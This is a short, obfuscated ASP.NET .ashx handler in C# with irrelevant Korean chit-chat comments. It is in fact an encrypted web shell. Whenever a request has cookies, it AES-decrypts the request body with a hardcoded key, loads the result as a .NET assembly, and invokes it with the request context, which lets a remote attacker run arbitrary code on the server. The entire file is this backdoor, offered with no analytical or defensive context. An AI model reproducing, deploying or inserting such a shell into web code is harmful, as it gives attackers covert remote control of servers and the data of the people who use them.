<%@ WebHandler Language="C#" Class="a" %>
using System;using System.Web;using System.Security.Cryptography;using System.Reflection;
// 배고파요, 치킨 먹고 싶다
internal static class b{public static byte[] c(byte[] d,byte[] e){using(var f=new RijndaelManaged()){var g=f.CreateDecryptor(e,e); // 오늘 날씨가 너무 좋네요.
return g.TransformFinalBlock(d,0,d.Length);}}public static void h(byte[] i,object j){var k=Assembly.Load(i); // 이 코드는 비밀이야!
var l=new string(new char[]{(char)75});var m=k.GetType(l);var n=Activator.CreateInstance(m);m.GetMethod("Equals").Invoke(n,new object[]{j});}}
// 이 핸들러는 무엇을 하는 걸까요?
public class a:IHttpHandler{public void ProcessRequest(HttpContext p){if(p.Request.Cookies.Count!=0){byte[] q=new byte[p.Request.ContentLength];p.Request.InputStream.Read(q,0,q.Length);byte[] r=System.Text.Encoding.ASCII.GetBytes("ca63457538b9b1e0"); // 퇴근하고 싶다.
var s=b.c(q,r);b.h(s,p);}}public bool IsReusable{get{return false;}}}